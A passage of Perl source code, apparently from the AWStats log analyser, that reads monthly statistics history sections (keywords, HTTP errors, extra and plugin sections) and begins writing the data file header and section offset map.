$SectionsToLoad{'searchwords'};\n\t\t\t\tif ( $SectionsToSave{'searchwords'} ) {\n\t\t\t\t\tSave_History( 'searchwords', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{ 'searchwords'\n\t\t\t\t\t  };    # This save searwords and keywords sections\n\t\t\t\t\tif ($withpurge) { %_keyphrases = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_KEYWORDS\n\t\t\tif ( $field[0] eq 'BEGIN_KEYWORDS' ) {\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" Begin of KEYWORDS section ($MaxNbOf{'KeywordsShown'},$MinHit{'Keyword'})\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'keywords'} ) {\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) { $loadrecord = 1; }\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif (   $countloaded < $MaxNbOf{'KeywordsShown'}\n\t\t\t\t\t\t\t\t\t&& $field[1] >= $MinHit{'Keyword'} )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$TotalDifferentKeywords++;\n\t\t\t\t\t\t\t\t$TotalKeywords += ( $field[1] || 0 );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_keywords{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_KEYWORDS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_KEYWORDS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_KEYWORDS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_KEYWORDS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section KEYWORDS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of KEYWORDS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'keywords'};\n\t\t\t\tif ( $SectionsToSave{'keywords'} ) {\n\t\t\t\t\tSave_History( 'keywords', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'keywords'};\n\t\t\t\t\tif ($withpurge) { %_keywords = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_ERRORS\n\t\t\tif ( $field[0] eq 'BEGIN_ERRORS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of ERRORS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'errors'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_errors_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_errors_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_ERRORS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_ERRORS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_ERRORS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_ERRORS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section ERRORS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of ERRORS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'errors'};\n\t\t\t\tif ( $SectionsToSave{'errors'} ) {\n\t\t\t\t\tSave_History( 'errors', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'errors'};\n\t\t\t\t\tif ($withpurge) { %_errors_h = (); %_errors_k = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SIDER_xxx\n\t\t\tforeach my $code ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\t\tif ( $field[0] eq \"BEGIN_SIDER_$code\" ) {\n\t\t\t\t\tif ($Debug) { debug(\" Begin of SIDER_$code section\"); }\n\t\t\t\t\t$field[0] = '';\n\t\t\t\t\tmy $count       = 0;\n\t\t\t\t\tmy $countloaded = 0;\n\t\t\t\t\tdo {\n\t\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t\t$count++;\n\t\t\t\t\t\t\tif ( $SectionsToLoad{\"sider_$code\"} ) {\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_sider_h{$code}{$field[0]} += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $withupdate || $HTMLOutput{\"errors$code\"} )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tmy $fieldidx = 2;\n\t\t\t\t\t\t\t\t\tforeach (split(//, $ShowHTTPErrorsPageDetail)) {\n\t\t\t\t\t\t\t\t\t\tlast if (! $field[$fieldidx] );\n\t\t\t\t\t\t\t\t\t\tif ( $_ =~ /R/i ) {\n\t\t\t\t\t\t\t\t\t\t\t$_referer_h{$code}{$field[0]} = $field[2];\n\t\t\t\t\t\t\t\t\t\t} elsif ( $_ =~ /H/i ) {\n\t\t\t\t\t\t\t\t\t\t\t$_err_host_h{$code}{$field[0]} = $field[$fieldidx];\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$fieldidx++;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\t\tchomp $_;\n\t\t\t\t\t\ts/\\r//;\n\t\t\t\t\t\t@field = split(\n\t\t\t\t\t\t\t/\\s+/,\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t$readxml\n\t\t\t\t\t\t\t\t? XMLDecodeFromHisto($_)\n\t\t\t\t\t\t\t\t: $_\n\t\t\t\t\t\t\t)\n\t\t\t\t\t\t);\n\t\t\t\t\t\t$countlines++;\n\t\t\t\t\t  } until ( $field[0] eq \"END_SIDER_$code\"\n\t\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SIDER_$code\"\n\t\t\t\t\t\t  || !$_ );\n\t\t\t\t\tif (   $field[0] ne \"END_SIDER_$code\"\n\t\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SIDER_$code\" )\n\t\t\t\t\t{\n\t\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SIDER_$code not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" End of SIDER_$code section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tdelete $SectionsToLoad{\"sider_$code\"};\n\t\t\t\t\tif ( $SectionsToSave{\"sider_$code\"} ) {\n\t\t\t\t\t\tSave_History( \"sider_$code\", $year, $month, $date );\n\t\t\t\t\t\tdelete $SectionsToSave{\"sider_$code\"};\n\t\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t\t%_sider_h   = ();\n\t\t\t\t\t\t\t%_referer_h = ();\n\t\t\t\t\t\t\t%_err_host_h = ();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# BEGIN_EXTRA_xxx\n\t\t\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\t\t\tif ( $field[0] eq \"BEGIN_EXTRA_$extranum\" ) {\n\t\t\t\t\tif ($Debug) { debug(\" Begin of EXTRA_$extranum\"); }\n\t\t\t\t\t$field[0] = '';\n\t\t\t\t\tmy $count       = 0;\n\t\t\t\t\tmy $countloaded = 0;\n\t\t\t\t\tdo {\n\t\t\t\t\t\tif ( $field[0] ne '' ) {\n\t\t\t\t\t\t\t$count++;\n\t\t\t\t\t\t\tif ( $SectionsToLoad{\"extra_$extranum\"} ) {\n\t\t\t\t\t\t\t\tif (   $ExtraStatTypes[$extranum] =~ /P/i\n\t\t\t\t\t\t\t\t\t&& $field[1] )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t${ '_section_' . $extranum . '_p' }\n\t\t\t\t\t\t\t\t\t  { $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t${ '_section_' . $extranum . '_h' }\n\t\t\t\t\t\t\t\t  { $field[0] } += $field[2];\n\t\t\t\t\t\t\t\tif (   $ExtraStatTypes[$extranum] =~ /B/i\n\t\t\t\t\t\t\t\t\t&& $field[3] )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t${ '_section_' . $extranum . '_k' }\n\t\t\t\t\t\t\t\t\t  { $field[0] } += $field[3];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ /L/i\n\t\t\t\t\t\t\t\t\t&& !${ '_section_' . $extranum . '_l' }\n\t\t\t\t\t\t\t\t\t{ $field[0] }\n\t\t\t\t\t\t\t\t\t&& $field[4] )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t${ '_section_' . $extranum . '_l' }\n\t\t\t\t\t\t\t\t\t  { $field[0] } = int( $field[4] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\t\tchomp $_;\n\t\t\t\t\t\ts/\\r//;\n\t\t\t\t\t\t@field = split(\n\t\t\t\t\t\t\t/\\s+/,\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t$readxml\n\t\t\t\t\t\t\t\t? XMLDecodeFromHisto($_)\n\t\t\t\t\t\t\t\t: $_\n\t\t\t\t\t\t\t)\n\t\t\t\t\t\t);\n\t\t\t\t\t\t$countlines++;\n\t\t\t\t\t  } until ( $field[0] eq \"END_EXTRA_$extranum\"\n\t\t\t\t\t\t  || $field[0] eq \"${xmleb}END_EXTRA_$extranum\"\n\t\t\t\t\t\t  || !$_ );\n\t\t\t\t\tif (   $field[0] ne \"END_EXTRA_$extranum\"\n\t\t\t\t\t\t&& $field[0] ne \"${xmleb}END_EXTRA_$extranum\" )\n\t\t\t\t\t{\n\t\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section EXTRA_$extranum not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" End of EXTRA_$extranum section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tdelete $SectionsToLoad{\"extra_$extranum\"};\n\t\t\t\t\tif ( $SectionsToSave{\"extra_$extranum\"} ) {\n\t\t\t\t\t\tSave_History( \"extra_$extranum\", $year, $month, $date );\n\t\t\t\t\t\tdelete $SectionsToSave{\"extra_$extranum\"};\n\t\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t\t%{ '_section_' . $extranum . '_p' } = ();\n\t\t\t\t\t\t\t%{ '_section_' . $extranum . '_h' } = ();\n\t\t\t\t\t\t\t%{ '_section_' . $extranum . '_b' } = ();\n\t\t\t\t\t\t\t%{ '_section_' . $extranum . '_l' } = ();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# BEGIN_PLUGINS\n\t\t\tif (   $AtLeastOneSectionPlugin\n\t\t\t\t&& $field[0] =~ /^BEGIN_PLUGIN_(\\w+)$/i )\n\t\t\t{\n\t\t\t\tmy $pluginname = $1;\n\t\t\t\tmy $found      = 0;\n\t\t\t\tforeach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {\n\t\t\t\t\tif ( $pluginname eq $_ ) {\n\n\t\t\t\t\t\t# The plugin for this section was loaded\n\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\tmy $issectiontoload =\n\t\t\t\t\t\t  $SectionsToLoad{\"plugin_$pluginname\"};\n\n#               \t\t    my $function=\"SectionReadHistory_$pluginname(\\$issectiontoload,\\$readxml,\\$xmleb,\\$countlines)\";\n#               \t\t    eval(\"$function\");\n\t\t\t\t\t\tmy $function = \"SectionReadHistory_$pluginname\";\n\t\t\t\t\t\t&$function( $issectiontoload, $readxml, $xmleb,\n\t\t\t\t\t\t\t$countlines );\n\t\t\t\t\t\tdelete $SectionsToLoad{\"plugin_$pluginname\"};\n\t\t\t\t\t\tif ( $SectionsToSave{\"plugin_$pluginname\"} ) {\n\t\t\t\t\t\t\tSave_History( \"plugin_$pluginname\",\n\t\t\t\t\t\t\t\t$year, $month, $date );\n\t\t\t\t\t\t\tdelete $SectionsToSave{\"plugin_$pluginname\"};\n\t\t\t\t\t\t\tif ($withpurge) {\n\n#                           \t\tmy $function=\"SectionInitHashArray_$pluginname()\";\n#                           \t\teval(\"$function\");\n\t\t\t\t\t\t\t\tmy $function =\n\t\t\t\t\t\t\t\t  \"SectionInitHashArray_$pluginname\";\n\t\t\t\t\t\t\t\t&$function();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\n\t\t\t\t# The plugin for this section was not loaded\n\t\t\t\tif ( !$found ) {\n\t\t\t\t\tdo {\n\t\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\t\tchomp $_;\n\t\t\t\t\t\ts/\\r//;\n\t\t\t\t\t\t@field = split(\n\t\t\t\t\t\t\t/\\s+/,\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t$readxml\n\t\t\t\t\t\t\t\t? XMLDecodeFromHisto($_)\n\t\t\t\t\t\t\t\t: $_\n\t\t\t\t\t\t\t)\n\t\t\t\t\t\t);\n\t\t\t\t\t\t$countlines++;\n\t\t\t\t\t  } until ( $field[0] eq \"END_PLUGIN_$pluginname\"\n\t\t\t\t\t\t  || $field[0] eq \"${xmleb}END_PLUGIN_$pluginname\"\n\t\t\t\t\t\t  || !$_ );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n# For backward compatibility (ORIGIN section was \"HitFromx\" in old history files)\n\t\t\tif ( $SectionsToLoad{'origin'} ) {\n\t\t\t\tif ( $field[0] eq 'HitFrom0' ) {\n\t\t\t\t\t$_from_p[0] += 0;\n\t\t\t\t\t$_from_h[0] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom1' ) {\n\t\t\t\t\t$_from_p[1] += 0;\n\t\t\t\t\t$_from_h[1] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom2' ) {\n\t\t\t\t\t$_from_p[2] += 0;\n\t\t\t\t\t$_from_h[2] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom3' ) {\n\t\t\t\t\t$_from_p[3] += 0;\n\t\t\t\t\t$_from_h[3] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom4' ) {\n\t\t\t\t\t$_from_p[4] += 0;\n\t\t\t\t\t$_from_h[4] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom5' ) {\n\t\t\t\t\t$_from_p[5] += 0;\n\t\t\t\t\t$_from_h[5] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tif ($withupdate) {\n\n# Process rest of data saved in 'wait' arrays (data for hosts that are not in history file or no history file found)\n# This can change some values for day, sider and session sections\n\t\tif ($Debug) { debug( \" Processing data in 'wait' arrays\", 3 ); }\n\t\tforeach ( keys %_waithost_e ) {\n\t\t\tif ($Debug) {\n\t\t\t\tdebug( \"  Visit in 'wait' array for $_ is a new visit\", 4 );\n\t\t\t}\n\t\t\tmy $newtimehosts =\n\t\t\t  ( $_waithost_s{$_} ? $_waithost_s{$_} : $_host_s{$_} );\n\t\t\tmy $newtimehostl =\n\t\t\t  ( $_waithost_l{$_} ? $_waithost_l{$_} : $_host_l{$_} );\n\t\t\t$_url_e{ $_waithost_e{$_} }++;\n\t\t\t$newtimehosts =~ /^(\\d\\d\\d\\d\\d\\d\\d\\d)/;\n\t\t\t$DayVisits{$1}++;\n\t\t\tif ( $_waithost_s{$_} ) {\n\n\t\t\t\t# There was also a second session in processed log\n\t\t\t\t$_session{ GetSessionRange( $newtimehosts, $newtimehostl ) }++;\n\t\t\t}\n\t\t}\n\t}\n\n# Write all unwrote sections in section order ('general','time', 'day','sider','session' and other...)\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" Check and write all unwrote sections: \"\n\t\t\t  . join( ',', keys %SectionsToSave ),\n\t\t\t2\n\t\t);\n\t}\n\tforeach my $key (\n\t\tsort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }\n\t\tkeys %SectionsToSave\n\t  )\n\t{\n\t\tSave_History( \"$key\", $year, $month, $date, $lastlinenb,\n\t\t\t$lastlineoffset, $lastlinechecksum );\n\t}\n\t%SectionsToSave = ();\n\n# Update offset in map section and last data in general section then close files\n\tif ($withupdate) {\n\t\tif ($xml) { print HISTORYTMP \"\\n\\n</xml>\\n\"; }\n\n\t\t# Update offset of sections in the MAP section\n\t\tforeach ( sort { $PosInFile{$a} <=> $PosInFile{$b} } keys %ValueInFile )\n\t\t{\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\" Update offset of section $_=$ValueInFile{$_} in file at offset $PosInFile{$_}\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $PosInFile{\"$_\"} ) {\n\t\t\t\tseek( HISTORYTMP, $PosInFile{\"$_\"}, 0 );\n\t\t\t\tprint HISTORYTMP $ValueInFile{\"$_\"};\n\t\t\t}\n\t\t}\n\n\t\t# Save last data in general sections\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Update MonthVisits=$MonthVisits{$year.$month} in file at offset $PosInFile{TotalVisits}\"\n\t\t\t);\n\t\t}\n\t\tseek( HISTORYTMP, $PosInFile{\"TotalVisits\"}, 0 );\n\t\tprint HISTORYTMP $MonthVisits{ $year . $month };\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Update MonthUnique=$MonthUnique{$year.$month} in file at offset $PosInFile{TotalUnique}\"\n\t\t\t);\n\t\t}\n\t\tseek( HISTORYTMP, $PosInFile{\"TotalUnique\"}, 0 );\n\t\tprint HISTORYTMP $MonthUnique{ $year . $month };\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Update MonthHostsKnown=$MonthHostsKnown{$year.$month} in file at offset $PosInFile{MonthHostsKnown}\"\n\t\t\t);\n\t\t}\n\t\tseek( HISTORYTMP, $PosInFile{\"MonthHostsKnown\"}, 0 );\n\t\tprint HISTORYTMP $MonthHostsKnown{ $year . $month };\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Update MonthHostsUnknown=$MonthHostsUnknown{$year.$month} in file at offset $PosInFile{MonthHostsUnknown}\"\n\t\t\t);\n\t\t}\n\t\tseek( HISTORYTMP, $PosInFile{\"MonthHostsUnknown\"}, 0 );\n\t\tprint HISTORYTMP $MonthHostsUnknown{ $year . $month };\n\t\tclose(HISTORYTMP) || error(\"Failed to write temporary history file\");\n\t}\n\tif ($withread) {\n\t\tclose(HISTORY) || error(\"Command for pipe '$filetoread' failed\");\n\t}\n\n\t# Purge data\n\tif ($withpurge) { &Init_HashArray(); }\n\n\t# If update, rename tmp file bis into tmp file or set HistoryAlreadyFlushed\n\tif ($withupdate) {\n\t\tif ( $HistoryAlreadyFlushed{\"$year$month$day$hour\"} ) {\n\t\t\tdebug(\n\t\t\t\t\"Rename tmp history file bis '$filetoread' to '$filetowrite'\");\n\t\t\tif ( rename( $filetowrite, $filetoread ) == 0 ) {\n\t\t\t\terror(\"Failed to update tmp history file $filetoread\");\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\t$HistoryAlreadyFlushed{\"$year$month$day$hour\"} = 1;\n\t\t}\n\n\t\tif ( !$ListOfYears{\"$year\"} || $ListOfYears{\"$year\"} lt \"$month\" ) {\n\t\t\t$ListOfYears{\"$year\"} = \"$month\";\n\t\t}\n\t}\n\n\t# For backward compatibility, if LastLine does not exist, set to LastTime\n\t$LastLine ||= $LastTime{$date};\n\n\treturn ( $withupdate ? \"$filetowrite\" : \"\" );\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tSave a part of history file\n# Parameters:\tsectiontosave,year,month,breakdate[,lastlinenb,lastlineoffset,lastlinechecksum]\n# Input:\t\t$VERSION HISTORYTMP $nowyear $nowmonth $nowday $nowhour $nowmin $nowsec $LastLineNumber $LastLineOffset $LastLineChecksum\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub Save_History {\n\tmy $sectiontosave = shift || '';\n\tmy $year          = shift || '';\n\tmy $month         = shift || '';\n\tmy $breakdate     = shift || '';\n\n\tmy $xml = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );\n\tmy (\n\t\t$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,\n\t\t$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee\n\t  )\n\t  = ( '', '', '', '', '', '', '', '', '', '', '' );\n\tif ($xml) {\n\t\t(\n\t\t\t$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,\n\t\t\t$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee\n\t\t  )\n\t\t  = (\n\t\t\t\"</comment><nu>\\n\", '</nu><recnb>',\n\t\t\t'</recnb><table>',  '<tr><th>',\n\t\t\t'</th><th>',        '</th></tr>',\n\t\t\t'<tr><td>',         '</td><td>',\n\t\t\t'</td></tr>',       '</table><nu>',\n\t\t\t\"\\n</nu></section>\"\n\t\t  );\n\t}\n\telse { $xmlbs = ' '; $xmlhs = ' '; $xmlrs = ' '; }\n\n\tmy $lastlinenb       = shift || 0;\n\tmy $lastlineoffset   = shift || 0;\n\tmy $lastlinechecksum = shift || 0;\n\tif ( !$lastlinenb ) {    # This happens for migrate\n\t\t$lastlinenb       = $LastLineNumber;\n\t\t$lastlineoffset   = $LastLineOffset;\n\t\t$lastlinechecksum = $LastLineChecksum;\n\t}\n\n\tif ($Debug) {\n\t\tdebug(\n\" Save_History [sectiontosave=$sectiontosave,year=$year,month=$month,breakdate=$breakdate,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]\",\n\t\t\t1\n\t\t);\n\t}\n\tmy $spacebar      = \"                    \";\n\tmy %keysinkeylist = ();\n\n\t# Header\n\tif ( $sectiontosave eq 'header' ) {\n\t\tif ($xml) { print HISTORYTMP \"<version><lib>\\n\"; }\n\t\tprint HISTORYTMP \"AWSTATS DATA FILE $VERSION\\n\";\n\t\tif ($xml) { print HISTORYTMP \"</lib><comment>\\n\"; }\n\t\tprint HISTORYTMP\n\"# If you remove this file, all statistics for date $breakdate will be lost/reset.\\n\";\n\t\tprint HISTORYTMP\n\t\t  \"# Last config file used to build this data file was $FileConfig.\\n\";\n\t\tif ($xml) { print HISTORYTMP \"</comment></version>\\n\"; }\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# Position (offset in bytes) in this file for beginning of each section for\\n\";\n\t\tprint HISTORYTMP\n\"# direct I/O access. If you made changes somewhere in this file, you should\\n\";\n\t\tprint HISTORYTMP\n\"# also remove completely the MAP section (AWStats will rewrite it at next\\n\";\n\t\tprint HISTORYTMP \"# update).\\n\";\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_MAP${xmlbs}\"\n\t\t  . ( 27 + ( scalar keys %TrapInfosForHTTPErrorCodes ) +\n\t\t\t  ( scalar @ExtraName ? scalar @ExtraName - 1 : 0 ) +\n\t\t\t  ( scalar keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) )\n\t\t  . \"${xmlbe}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_GENERAL${xmlrs}\";\n\t\t$PosInFile{\"general\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# When\n\t\tprint HISTORYTMP \"${xmlrb}POS_TIME${xmlrs}\";\n\t\t$PosInFile{\"time\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_VISITOR${xmlrs}\";\n\t\t$PosInFile{\"visitor\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_DAY${xmlrs}\";\n\t\t$PosInFile{\"day\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# Who\n\t\tprint HISTORYTMP \"${xmlrb}POS_DOMAIN${xmlrs}\";\n\t\t$PosInFile{\"domain\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_LOGIN${xmlrs}\";\n\t\t$PosInFile{\"login\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_ROBOT${xmlrs}\";\n\t\t$PosInFile{\"robot\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP 